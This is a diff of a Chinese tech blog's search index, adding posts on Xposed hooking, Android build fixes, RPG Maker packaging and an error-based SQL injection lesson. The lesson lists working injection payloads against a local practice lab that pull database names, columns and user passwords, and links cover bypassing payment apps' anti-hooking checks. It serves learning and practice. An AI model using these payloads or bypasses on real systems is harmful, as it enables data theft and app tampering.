@@ -5,7 +5,10 @@
     <url>/post/2961313865.html</url>
     <content><![CDATA[<hr>
 <h1 id="daily"><a href="#daily" class="headerlink" title="daily"></a>daily</h1><hr>
-<h2 id="2019-11-14"><a href="#2019-11-14" class="headerlink" title="2019-11-14"></a>2019-11-14</h2><h4 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h4><hr>
+<h2 id="2019-11-18"><a href="#2019-11-18" class="headerlink" title="2019-11-18"></a>2019-11-18</h2><h4 id="1-MagiskFrida"><a href="#1-MagiskFrida" class="headerlink" title="1.[MagiskFrida]"></a>1.[MagiskFrida]</h4><p>Frida与magisk合体：<br>Runs frida-server on boot as root with magisk.<br><a href="https://github.com/AeonLucid/MagiskFrida" target="_blank" rel="noopener">MagiskFrida</a><br>加强版<br><a href="https://github.com/toolsRE/MagiskFridaEnv" target="_blank" rel="noopener">MagiskFridaEnv</a>  </p>
+<h4 id="2-edxposed"><a href="#2-edxposed" class="headerlink" title="2.edxposed"></a>2.edxposed</h4><p>Android 7.0以上使用EdXposed：<br><a href="https://github.com/ElderDrivers/EdXposed" target="_blank" rel="noopener">EdXposed</a><br><a href="https://github.com/ElderDrivers/EdXposedManager" target="_blank" rel="noopener">EdXposedManager</a></p>
+<h4 id="3-SDK热修复"><a href="#3-SDK热修复" class="headerlink" title="3.SDK热修复"></a>3.SDK热修复</h4><h4 id="4-android本地sql注入导致ddos"><a href="#4-android本地sql注入导致ddos" class="headerlink" title="4.android本地sql注入导致ddos"></a>4.android本地sql注入导致ddos</h4><p><a href="https://mp.weixin.qq.com/s?__biz=MzU4NzU1MjE4OQ==&amp;mid=2247484014&amp;idx=1&amp;sn=8f4967e70960ee4be311414dced89812&amp;chksm=fdeb06bcca9c8faa8aa192c80792d15b2f36b3c1a2744a88ad50b39feee4a2e1864441179710&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1573792060913&amp;sharer_shareid=e510e2a3a3c3888e73db582328234314" target="_blank" rel="noopener">【技术分享】Android本地SQL注入的dos攻击方式</a>  </p>
+<hr>
 <h2 id="2019-11-12"><a href="#2019-11-12" class="headerlink" title="2019-11-12"></a>2019-11-12</h2><h4 id="1-android-AES加密"><a href="#1-android-AES加密" class="headerlink" title="1.android AES加密"></a>1.android AES加密</h4><p><a href="https://www.jianshu.com/p/eef4a0355474" target="_blank" rel="noopener">Android中AES加密算法</a>  </p>
 <h4 id="2-ctf-android-逆向题目"><a href="#2-ctf-android-逆向题目" class="headerlink" title="2.ctf-android-逆向题目"></a>2.ctf-android-逆向题目</h4><p><a href="https://blog.csdn.net/CharlesGodX/article/details/86602958" target="_blank" rel="noopener">CTF-安卓逆向入门题目</a><br><a href="https://github.com/ThunderJie/CTF-Practice/blob/master/CTF-Andorid%20Reverse/smali/Crackme.smali" target="_blank" rel="noopener">ThunderJie/CTF-Practice</a><br><a href="https://github.com/Gallopsled/pwntools-write-ups" target="_blank" rel="noopener">Gallopsled/pwntools-write-ups</a><br><a href="https://github.com/monosource/radare2-explorations-binaries" target="_blank" rel="noopener">monosource/radare2-explorations-binaries</a><br>android逆向工具<br><a href="https://github.com/CalebFenton/simplify" target="_blank" rel="noopener">CalebFenton/simplify</a><br><a href="http://www.blogjava.net/midea0978/archive/2012/01/04/367847.html" target="_blank" rel="noopener">Dalvik opcodes/smail语法</a>  </p>
 <h4 id="3-ctf-pwn-wp"><a href="#3-ctf-pwn-wp" class="headerlink" title="3.ctf-pwn-wp"></a>3.ctf-pwn-wp</h4><p><a href="https://firmianay.github.io/2017/02/20/ioli_crackme_writeup.html" target="_blank" rel="noopener">IOLI crackme Writeup</a><br><a href="https://github.com/zardus/ctf-tools" target="_blank" rel="noopener">zardus/ctf-tools</a>  </p>
@@ -3704,6 +3707,111 @@ mount: Permission denied</code>这个问题就新开一个命令行窗口执行<
       </tags>
   </entry>
   <entry>
+    <title>android VitualXposed 模块编写</title>
+    <url>/post/4010998048.html</url>
+    <content><![CDATA[<h2 id="virtual-Xposed"><a href="#virtual-Xposed" class="headerlink" title="virtual Xposed"></a>virtual Xposed</h2><p><a href="https://pan.baidu.com/s/1GHoOGm7DuBtkL9AgsaJvNA" target="_blank" rel="noopener">virtual Xposed下载链接: </a><br>提取码: kyrd    </p>
+<p><a href="https://github.com/android-hacker/VirtualXposed/wiki/Utilities-For-Xposed-Module-Developer" target="_blank" rel="noopener">virtual xposed wiki</a>  </p>
+<h2 id="vx的一些命令"><a href="#vx的一些命令" class="headerlink" title="vx的一些命令"></a>vx的一些命令</h2><pre><code>adb shell am start io.va.exposed/io.virtualapp.splash.SplashActivity 启动
+adb shell am broadcast -a io.va.exposed.CMD -e cmd reboot 重启
+adb shell am broadcast -a io.va.exposed.CMD -e cmd update -e pkg &lt;package-name&gt; 安装更新app
+adb shell am broadcast -a io.va.exposed.CMD -e cmd launch -e pkg &lt;package-name&gt; 启动内部app
+</code></pre><h2 id="编写Xposed模块"><a href="#编写Xposed模块" class="headerlink" title="编写Xposed模块"></a>编写Xposed模块</h2><p>1.xposed依赖<br><a href="https://jcenter.bintray.com/de/robv/android/xposed/api/" target="_blank" rel="noopener">xposed</a>  </p>
+<p>build.gradle中添加  </p>
+<pre><code>compileOnly &#39;de.robv.android.xposed:api:82&#39;
+compileOnly &#39;de.robv.android.xposed:api:82:sources&#39;
+</code></pre><p>2.AndroidManifest.xml添加Xposed模块  </p>
+<pre><code>&lt;application&gt;
+    &lt;meta-data
+        android:name=&quot;xposedmodule&quot;
+        android:value=&quot;true&quot; /&gt;
+    &lt;meta-data
+        android:name=&quot;xposeddescription&quot;
+        android:value=&quot;this is a xposed demo&quot; /&gt;
+    &lt;meta-data
+        android:name=&quot;xposedminversion&quot;
+        android:value=&quot;30&quot; /&gt;
+&lt;/application&gt;
+</code></pre><p>3.新建个项目为被hook  </p>
+<p>MainActivity.java  </p>
+<pre><code>public class MainActivity extends AppCompatActivity {
+
+    private Button btn;
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+        btn = findViewById(R.id.btn);
+        btn.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View view) {
+                Toast.makeText(MainActivity.this, toastMessage(), Toast.LENGTH_SHORT).show();
+            }
+        });
+    }
+    public String toastMessage() {
+        return &quot;我没有被劫持&quot;;
+    }
+}
+</code></pre><p>activity_main.xml  </p>
+<pre><code>&lt;android.support.constraint.ConstraintLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;
+    xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;
+    xmlns:tools=&quot;http://schemas.android.com/tools&quot;
+    android:layout_width=&quot;match_parent&quot;
+    android:layout_height=&quot;match_parent&quot;
+    tools:context=&quot;.MainActivity&quot;&gt;
+    &lt;Button
+        android:id=&quot;@+id/btn&quot;
+        app:layout_constraintLeft_toLeftOf=&quot;parent&quot;
+        app:layout_constraintTop_toTopOf=&quot;parent&quot;
+        android:layout_width=&quot;wrap_content&quot;
+        android:layout_height=&quot;wrap_content&quot;
+        android:text=&quot;btn&quot;/&gt;
+
+&lt;/android.support.constraint.ConstraintLayout&gt;
+
+</code></pre><p>打包安装到VirtualXposed  </p>
+<p>4.编写hook类<br><a href="https://api.xposed.info/reference/de/robv/android/xposed/XposedHelpers.html" target="_blank" rel="noopener">XposedHelpers api</a>  </p>
+<pre><code>public class HookToast implements IXposedHookLoadPackage {
+    @Override
+    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) throws Throwable {
+        if (lpparam.packageName.equals(&quot;com.demo.myapplication&quot;)){
+            Class clazz = lpparam.classLoader.loadClass(&quot;com.demo.myapplication.MainActivity&quot;);
+            XposedHelpers.findAndHookMethod(clazz, &quot;toastMessage&quot;, new XC_MethodHook() {
+                @Override
+                protected void beforeHookedMethod(MethodHookParam param) throws Throwable { //hook之前
+//                    super.beforeHookedMethod(param);
+                    XposedBridge.log(&quot;you are been hooked&quot;); 
+                }
+
+                @Override
+                protected void afterHookedMethod(MethodHookParam param) throws Throwable { // hook之后
+//                    super.afterHookedMethod(param);
+                    param.setResult(&quot;hacked by tea&quot;); //改变返回结果 
+                }
+            });
+        }
+    }
+}
+</code></pre><pre><code>新建app/assets文件夹
+新建xposed_init文件
+添加
+com.demo.android_hook.HookToast //修改成你的hook类
+
+然后打包测试
+</code></pre><p>app/assets/xposed_init  </p>
+<pre><code>com.demo.android_hook.HookToast
+</code></pre><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/27/01.jpg" alt="最后效果">  </p>
+<h2 id="LINKS"><a href="#LINKS" class="headerlink" title="LINKS"></a>LINKS</h2><p><a href="https://blog.csdn.net/ZhangChengHai/article/details/82950334" target="_blank" rel="noopener">Magisk框架，VirtualXposed框架，Xposed框架比较</a><br><a href="https://github.com/wayu002/AlipayQRHook" target="_blank" rel="noopener">AlipayQRHook</a><br><a href="https://www.jianshu.com/p/938e8c4c00df" target="_blank" rel="noopener">Xposed 模块免重启开发(借助VirtualXposed)</a><br><a href="https://www.52pojie.cn/thread-688466-1-1.html" target="_blank" rel="noopener">【Xposed模块开发入门】真·第一课</a><br><a href="https://www.52pojie.cn/thread-821871-1-1.html" target="_blank" rel="noopener">XPosed插件自动生成支付宝收款二维码</a><br><a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=794312&amp;extra=page%3D1%26filter%3Ddigest%26digest%3D1" target="_blank" rel="noopener">Android支付宝蚂蚁森林能量自动收取插件开发原理解析</a><br><a href="https://blog.csdn.net/ryan168/article/details/82462821" target="_blank" rel="noopener">关于如何使用xposed来hook某支付软件</a><br><a href="https://blog.csdn.net/jiangwei0910410003/article/details/80037971" target="_blank" rel="noopener">Android逆向之旅—破解某支付软件防Xposed的hook功能检测机制过程分析</a><br><a href="https://blog.csdn.net/ly_xiamu/article/details/81940896" target="_blank" rel="noopener">xposed检测原理分析 -案例某付宝、某音</a><br><a href="https://www.jianshu.com/p/938e8c4c00df" target="_blank" rel="noopener">Xposed 模块免重启开发(借助VirtualXposed)</a><br><a href="https://blog.csdn.net/zhangmiaoping23/article/details/53365780" target="_blank" rel="noopener">Android Hook框架Xposed详解：从源代码分析到开发指南</a><br><a href="https://blog.csdn.net/zhangmiaoping23/article/details/80432276" target="_blank" rel="noopener">VirtualXposed</a><br><a href="https://blog.csdn.net/d3soft/article/details/53209352" target="_blank" rel="noopener">xposed框架-Hook修改imei imsi</a>  </p>
+]]></content>
+      <categories>
+        <category>android逆向</category>
+      </categories>
+      <tags>
+        <tag>android逆向</tag>
+        <tag>xposed</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>smali hello</title>
     <url>/post/229799766.html</url>
     <content><![CDATA[<h2 id="条件跳转分支"><a href="#条件跳转分支" class="headerlink" title="条件跳转分支"></a>条件跳转分支</h2><pre><code>条件跳转分支：
@@ -3932,111 +4040,6 @@ Hello World
       <tags>
         <tag>android逆向</tag>
         <tag>smali</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>android VitualXposed 模块编写</title>
-    <url>/post/4010998048.html</url>
-    <content><![CDATA[<h2 id="virtual-Xposed"><a href="#virtual-Xposed" class="headerlink" title="virtual Xposed"></a>virtual Xposed</h2><p><a href="https://pan.baidu.com/s/1GHoOGm7DuBtkL9AgsaJvNA" target="_blank" rel="noopener">virtual Xposed下载链接: </a><br>提取码: kyrd    </p>
-<p><a href="https://github.com/android-hacker/VirtualXposed/wiki/Utilities-For-Xposed-Module-Developer" target="_blank" rel="noopener">virtual xposed wiki</a>  </p>
-<h2 id="vx的一些命令"><a href="#vx的一些命令" class="headerlink" title="vx的一些命令"></a>vx的一些命令</h2><pre><code>adb shell am start io.va.exposed/io.virtualapp.splash.SplashActivity 启动
-adb shell am broadcast -a io.va.exposed.CMD -e cmd reboot 重启
-adb shell am broadcast -a io.va.exposed.CMD -e cmd update -e pkg &lt;package-name&gt; 安装更新app
-adb shell am broadcast -a io.va.exposed.CMD -e cmd launch -e pkg &lt;package-name&gt; 启动内部app
-</code></pre><h2 id="编写Xposed模块"><a href="#编写Xposed模块" class="headerlink" title="编写Xposed模块"></a>编写Xposed模块</h2><p>1.xposed依赖<br><a href="https://jcenter.bintray.com/de/robv/android/xposed/api/" target="_blank" rel="noopener">xposed</a>  </p>
-<p>build.gradle中添加  </p>
-<pre><code>compileOnly &#39;de.robv.android.xposed:api:82&#39;
-compileOnly &#39;de.robv.android.xposed:api:82:sources&#39;
-</code></pre><p>2.AndroidManifest.xml添加Xposed模块  </p>
-<pre><code>&lt;application&gt;
-    &lt;meta-data
-        android:name=&quot;xposedmodule&quot;
-        android:value=&quot;true&quot; /&gt;
-    &lt;meta-data
-        android:name=&quot;xposeddescription&quot;
-        android:value=&quot;this is a xposed demo&quot; /&gt;
-    &lt;meta-data
-        android:name=&quot;xposedminversion&quot;
-        android:value=&quot;30&quot; /&gt;
-&lt;/application&gt;
-</code></pre><p>3.新建个项目为被hook  </p>
-<p>MainActivity.java  </p>
-<pre><code>public class MainActivity extends AppCompatActivity {
-
-    private Button btn;
-    @Override
-    protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
-        btn = findViewById(R.id.btn);
-        btn.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View view) {
-                Toast.makeText(MainActivity.this, toastMessage(), Toast.LENGTH_SHORT).show();
-            }
-        });
-    }
-    public String toastMessage() {
-        return &quot;我没有被劫持&quot;;
-    }
-}
-</code></pre><p>activity_main.xml  </p>
-<pre><code>&lt;android.support.constraint.ConstraintLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;
-    xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;
-    xmlns:tools=&quot;http://schemas.android.com/tools&quot;
-    android:layout_width=&quot;match_parent&quot;
-    android:layout_height=&quot;match_parent&quot;
-    tools:context=&quot;.MainActivity&quot;&gt;
-    &lt;Button
-        android:id=&quot;@+id/btn&quot;
-        app:layout_constraintLeft_toLeftOf=&quot;parent&quot;
-        app:layout_constraintTop_toTopOf=&quot;parent&quot;
-        android:layout_width=&quot;wrap_content&quot;
-        android:layout_height=&quot;wrap_content&quot;
-        android:text=&quot;btn&quot;/&gt;
-
-&lt;/android.support.constraint.ConstraintLayout&gt;
-
-</code></pre><p>打包安装到VirtualXposed  </p>
-<p>4.编写hook类<br><a href="https://api.xposed.info/reference/de/robv/android/xposed/XposedHelpers.html" target="_blank" rel="noopener">XposedHelpers api</a>  </p>
-<pre><code>public class HookToast implements IXposedHookLoadPackage {
-    @Override
-    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) throws Throwable {
-        if (lpparam.packageName.equals(&quot;com.demo.myapplication&quot;)){
-            Class clazz = lpparam.classLoader.loadClass(&quot;com.demo.myapplication.MainActivity&quot;);
-            XposedHelpers.findAndHookMethod(clazz, &quot;toastMessage&quot;, new XC_MethodHook() {
-                @Override
-                protected void beforeHookedMethod(MethodHookParam param) throws Throwable { //hook之前
-//                    super.beforeHookedMethod(param);
-                    XposedBridge.log(&quot;you are been hooked&quot;); 
-                }
-
-                @Override
-                protected void afterHookedMethod(MethodHookParam param) throws Throwable { // hook之后
-//                    super.afterHookedMethod(param);
-                    param.setResult(&quot;hacked by tea&quot;); //改变返回结果 
-                }
-            });
-        }
-    }
-}
-</code></pre><pre><code>新建app/assets文件夹
-新建xposed_init文件
-添加
-com.demo.android_hook.HookToast //修改成你的hook类
-
-然后打包测试
-</code></pre><p>app/assets/xposed_init  </p>
-<pre><code>com.demo.android_hook.HookToast
-</code></pre><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/27/01.jpg" alt="最后效果">  </p>
-<h2 id="LINKS"><a href="#LINKS" class="headerlink" title="LINKS"></a>LINKS</h2><p><a href="https://blog.csdn.net/ZhangChengHai/article/details/82950334" target="_blank" rel="noopener">Magisk框架，VirtualXposed框架，Xposed框架比较</a><br><a href="https://github.com/wayu002/AlipayQRHook" target="_blank" rel="noopener">AlipayQRHook</a><br><a href="https://www.jianshu.com/p/938e8c4c00df" target="_blank" rel="noopener">Xposed 模块免重启开发(借助VirtualXposed)</a><br><a href="https://www.52pojie.cn/thread-688466-1-1.html" target="_blank" rel="noopener">【Xposed模块开发入门】真·第一课</a><br><a href="https://www.52pojie.cn/thread-821871-1-1.html" target="_blank" rel="noopener">XPosed插件自动生成支付宝收款二维码</a><br><a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=794312&amp;extra=page%3D1%26filter%3Ddigest%26digest%3D1" target="_blank" rel="noopener">Android支付宝蚂蚁森林能量自动收取插件开发原理解析</a><br><a href="https://blog.csdn.net/ryan168/article/details/82462821" target="_blank" rel="noopener">关于如何使用xposed来hook某支付软件</a><br><a href="https://blog.csdn.net/jiangwei0910410003/article/details/80037971" target="_blank" rel="noopener">Android逆向之旅—破解某支付软件防Xposed的hook功能检测机制过程分析</a><br><a href="https://blog.csdn.net/ly_xiamu/article/details/81940896" target="_blank" rel="noopener">xposed检测原理分析 -案例某付宝、某音</a><br><a href="https://www.jianshu.com/p/938e8c4c00df" target="_blank" rel="noopener">Xposed 模块免重启开发(借助VirtualXposed)</a><br><a href="https://blog.csdn.net/zhangmiaoping23/article/details/53365780" target="_blank" rel="noopener">Android Hook框架Xposed详解：从源代码分析到开发指南</a><br><a href="https://blog.csdn.net/zhangmiaoping23/article/details/80432276" target="_blank" rel="noopener">VirtualXposed</a><br><a href="https://blog.csdn.net/d3soft/article/details/53209352" target="_blank" rel="noopener">xposed框架-Hook修改imei imsi</a>  </p>
-]]></content>
-      <categories>
-        <category>android逆向</category>
-      </categories>
-      <tags>
-        <tag>android逆向</tag>
-        <tag>xposed</tag>
       </tags>
   </entry>
   <entry>
@@ -5541,6 +5544,32 @@ String textSource = &quot;江苏苏宁VS上海上港-&lt;font color=&#39;#FF6059
       </tags>
   </entry>
   <entry>
+    <title>android_No toolchains found in the NDK toolchains folder for ABI with prefix: mips64el-linux-android</title>
+    <url>/post/3707592036.html</url>
+    <content><![CDATA[<p>主要是缺少这个文件 mips64el-linux-android<br>同理一些相同NDK目录可能也是缺少某些文件  </p>
+<pre><code>ndk目录
+/Users/shaomiao/Library/Android/sdk/ndk-bundle
+</code></pre><p>1.打开项目local.properties文件</p>
+<pre><code>Project/local.properties
+
+ndk.dir
+</code></pre><p>2.打开ndk.dir文件夹</p>
+<p>3.下载对应的ndk  </p>
+<p><a href="https://developer.android.com/ndk/downloads/?hl=zh-cn" target="_blank" rel="noopener">ndk下载</a>  </p>
+<p>4.打开toolchains文件夹  </p>
+<p>5.从下载的ndk目录中toolchains/mips64el-linux-android-4.9 复制到 项目ndk-bundle/toolchains目录里</p>
+<p>6.make project</p>
+<pre><code>build/Make Project
+</code></pre><h2 id="LINKS"><a href="#LINKS" class="headerlink" title="LINKS"></a>LINKS</h2><p><a href="https://blog.csdn.net/qq_24118527/article/details/82867864" target="_blank" rel="noopener">完美解决 No toolchains found in the NDK toolchains folder for ABI with prefix: mips64el-linux-android</a>  </p>
+]]></content>
+      <categories>
+        <category>android</category>
+      </categories>
+      <tags>
+        <tag>android</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>android里layout.xml的include</title>
     <url>/post/2155240333.html</url>
     <content><![CDATA[<pre><code>include 两个一样的layout
@@ -5622,32 +5651,6 @@ item2_tv4.setText(&quot;64-23&quot;);
 item2_tv5.setText(&quot;进球-失球&quot;);
 item2_tv6.setText(&quot;1连胜中&quot;);
 </code></pre>]]></content>
-      <categories>
-        <category>android</category>
-      </categories>
-      <tags>
-        <tag>android</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>android_No toolchains found in the NDK toolchains folder for ABI with prefix: mips64el-linux-android</title>
-    <url>/post/3707592036.html</url>
-    <content><![CDATA[<p>主要是缺少这个文件 mips64el-linux-android<br>同理一些相同NDK目录可能也是缺少某些文件  </p>
-<pre><code>ndk目录
-/Users/shaomiao/Library/Android/sdk/ndk-bundle
-</code></pre><p>1.打开项目local.properties文件</p>
-<pre><code>Project/local.properties
-
-ndk.dir
-</code></pre><p>2.打开ndk.dir文件夹</p>
-<p>3.下载对应的ndk  </p>
-<p><a href="https://developer.android.com/ndk/downloads/?hl=zh-cn" target="_blank" rel="noopener">ndk下载</a>  </p>
-<p>4.打开toolchains文件夹  </p>
-<p>5.从下载的ndk目录中toolchains/mips64el-linux-android-4.9 复制到 项目ndk-bundle/toolchains目录里</p>
-<p>6.make project</p>
-<pre><code>build/Make Project
-</code></pre><h2 id="LINKS"><a href="#LINKS" class="headerlink" title="LINKS"></a>LINKS</h2><p><a href="https://blog.csdn.net/qq_24118527/article/details/82867864" target="_blank" rel="noopener">完美解决 No toolchains found in the NDK toolchains folder for ABI with prefix: mips64el-linux-android</a>  </p>
-]]></content>
       <categories>
         <category>android</category>
       </categories>
@@ -6543,6 +6546,28 @@ protected void attachBaseContext(Context context) {
       </tags>
   </entry>
   <entry>
+    <title>RPGMakerMV安卓版本打包</title>
+    <url>/post/683201593.html</url>
+    <content><![CDATA[<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><ol>
+<li>部署项目<br>文件-部署-Android/IOS<br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/16/01.png" alt="打包项目"><br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/16/03.png" alt="www文件目录">  </li>
+</ol>
+<h2 id="方式一：Website2APK"><a href="#方式一：Website2APK" class="headerlink" title="方式一：Website2APK"></a>方式一：Website2APK</h2><p>1.下载工具<br><a href="https://pan.baidu.com/s/1eSQ65Lg" target="_blank" rel="noopener">下载地址</a><br>密码：vqv5  </p>
+<p>2.基本配置<br>选择Local HTML Website - 然后选择Directory of Local Website-GENERATE APK<br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/21/01.png" alt="打包配置">  </p>
+<h2 id="方式二：HTML一键打包工具"><a href="#方式二：HTML一键打包工具" class="headerlink" title="方式二：HTML一键打包工具"></a>方式二：HTML一键打包工具</h2><p>1.工具<br><a href="https://pan.baidu.com/s/18zv4O-BD-mWKQYApTj-r4g?errno=0&amp;errmsg=Auth%20Login%20Sucess&amp;&amp;bduss=&amp;ssnerror=0&amp;traceid=" target="_blank" rel="noopener">下载地址</a>  </p>
+<p>2.安装HTML一键打包工具<br>路径选择为www下index.html<br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/16/02.png" alt="打包配置">  </p>
+<p>tips:<br>免费版不能修改icon和包名  </p>
+<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>1.文件名不要中文<br>2.项目中不能含有中文的名称  </p>
+<h2 id="LINKS"><a href="#LINKS" class="headerlink" title="LINKS"></a>LINKS</h2><p><a href="https://blog.csdn.net/u012416063/article/details/81264317" target="_blank" rel="noopener">RPG MAKER MV 打包APK教程(一键打包,无需编写任何代码)</a><br><a href="https://www.bilibili.com/video/av19033912" target="_blank" rel="noopener">RpgMv游戏最简单打包apk教程，小白福利</a>  </p>
+]]></content>
+      <categories>
+        <category>rpgmakermv</category>
+      </categories>
+      <tags>
+        <tag>rpgmakermv</tag>
+        <tag>rpg</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>树莓派笔记</title>
     <url>/post/2224320310.html</url>
     <content><![CDATA[<h2 id="更新系统-amp-关机-amp-重启"><a href="#更新系统-amp-关机-amp-重启" class="headerlink" title="更新系统&amp;关机&amp;重启"></a>更新系统&amp;关机&amp;重启</h2><pre><code>sudo apt-get update &amp;&amp; sudo apt-get upgrade
@@ -6629,28 +6654,6 @@ pip install request
       </categories>
       <tags>
         <tag>树莓派</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>RPGMakerMV安卓版本打包</title>
-    <url>/post/683201593.html</url>
-    <content><![CDATA[<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><ol>
-<li>部署项目<br>文件-部署-Android/IOS<br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/16/01.png" alt="打包项目"><br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/16/03.png" alt="www文件目录">  </li>
-</ol>
-<h2 id="方式一：Website2APK"><a href="#方式一：Website2APK" class="headerlink" title="方式一：Website2APK"></a>方式一：Website2APK</h2><p>1.下载工具<br><a href="https://pan.baidu.com/s/1eSQ65Lg" target="_blank" rel="noopener">下载地址</a><br>密码：vqv5  </p>
-<p>2.基本配置<br>选择Local HTML Website - 然后选择Directory of Local Website-GENERATE APK<br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/21/01.png" alt="打包配置">  </p>
-<h2 id="方式二：HTML一键打包工具"><a href="#方式二：HTML一键打包工具" class="headerlink" title="方式二：HTML一键打包工具"></a>方式二：HTML一键打包工具</h2><p>1.工具<br><a href="https://pan.baidu.com/s/18zv4O-BD-mWKQYApTj-r4g?errno=0&amp;errmsg=Auth%20Login%20Sucess&amp;&amp;bduss=&amp;ssnerror=0&amp;traceid=" target="_blank" rel="noopener">下载地址</a>  </p>
-<p>2.安装HTML一键打包工具<br>路径选择为www下index.html<br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/16/02.png" alt="打包配置">  </p>
-<p>tips:<br>免费版不能修改icon和包名  </p>
-<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>1.文件名不要中文<br>2.项目中不能含有中文的名称  </p>
-<h2 id="LINKS"><a href="#LINKS" class="headerlink" title="LINKS"></a>LINKS</h2><p><a href="https://blog.csdn.net/u012416063/article/details/81264317" target="_blank" rel="noopener">RPG MAKER MV 打包APK教程(一键打包,无需编写任何代码)</a><br><a href="https://www.bilibili.com/video/av19033912" target="_blank" rel="noopener">RpgMv游戏最简单打包apk教程，小白福利</a>  </p>
-]]></content>
-      <categories>
-        <category>rpgmakermv</category>
-      </categories>
-      <tags>
-        <tag>rpgmakermv</tag>
-        <tag>rpg</tag>
       </tags>
   </entry>
   <entry>
@@ -11117,6 +11120,47 @@ http://greenrobot.org/eventbus/documentation/delivery-threads-threadmode/
       </tags>
   </entry>
   <entry>
+    <title>1.2.2-SQL注入-SQL注入语法类型-报错注入</title>
+    <url>/post/4239639054.html</url>
+    <content><![CDATA[<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="01-报错注入原理"><a href="#01-报错注入原理" class="headerlink" title="01 报错注入原理"></a>01 报错注入原理</h3><p>构造payload让信息通过错误提示回显出来<br>应用场景：<br>查询不回显内容，会打印错误信息<br>Update、insert等语句，会打印错误信息  </p>
+<pre><code>if($row)
+{
+    echo &#39;Your Login name:&#39;.$row[&#39;username&#39;];
+}
+else
+{
+    print_r(mysql_error());
+}
+</code></pre><h3 id="02-报错注入方法"><a href="#02-报错注入方法" class="headerlink" title="02 报错注入方法"></a>02 报错注入方法</h3><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/04/01.png" alt=""><br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/04/02.png" alt=""><br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/04/03.png" alt=""></p>
+<pre><code>select count(*) from information_schema.tables group by concat((select version()),floor(rand(0)*2));
+
+http://127.0.0.1:90/Less-1/?id=1&#39; and (select count(*) from information_schema.tables group by concat((select version()),floor(rand(0)*2)))--+
+
+http://127.0.0.1:90/Less-1/?id=1&#39; and (select count(*) from information_schema.tables group by concat((select user()),0x7e,floor(rand(0)*2)))--+
+
+http://127.0.0.1:90/Less-1/?id=1&#39; and (select count(*) from information_schema.tables group by concat((select database() limit 0,1),0x7e,floor(rand(0)*2)))--+ // 表名
+
+http://127.0.0.1:90/Less-1/?id=1&#39; and (select count(*) from information_schema.tables group by concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 3,1),0x7e,floor(rand(0)*2)))--+ // 列名
+
+http://127.0.0.1:90/Less-1/?id=1&#39; and (select count(*) from information_schema.tables group by concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 3,1),0x7e,floor(rand(0)*2)))--+ // 列名
+
+http://127.0.0.1:90/Less-1/?id=1&#39; and (select count(*) from information_schema.tables group by concat(0x7e,(select concat(username,0x7e,password) from users limit 0,1),0x7e,floor(rand(0)*2)))--+ // 数据
+</code></pre><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/04/04.png" alt=""><br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/04/05.png" alt=""></p>
+<pre><code>// 特殊符号导致方法报错，报错可以输出错误信息
+select ectractvalue(1,concat(0x7e,(select user()),0x7e));
+select updatexml(1,concat(0x7e,(select user()),0x7e),1);  
+
+报错注入只有32位长 用 substr截取字符串substr(&#39;ab&#39;,1,2) // 从第一位截取两个
+http://127.0.0.1:90/Less-1/?id=1&#39; and updatexml(1,concat(0x7e,(select substr(concat(password),1,2) from users limit 0,1),0x7e),1) --+
+</code></pre>]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>1.2.1-SQL注入-SQL注入语法类型-union联合查询注入</title>
     <url>/post/2839042794.html</url>
